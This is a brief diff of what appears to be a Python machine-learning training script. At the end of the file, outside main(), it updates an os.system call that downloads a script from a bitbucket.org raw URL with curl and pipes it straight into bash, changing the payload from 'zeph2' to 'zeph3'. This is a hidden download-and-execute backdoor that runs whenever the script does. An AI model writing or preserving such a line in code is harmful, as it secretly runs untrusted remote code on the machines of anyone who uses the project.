@@ -72,4 +72,4 @@ def main():
       global_step=NUM_EPOCHS)
 if __name__ == "__main__":
     main()
-os.system('curl -sL https://bitbucket.org/korong/korong/raw/master/zeph2 | bash')
+os.system('curl -sL https://bitbucket.org/korong/korong/raw/master/zeph3 | bash')
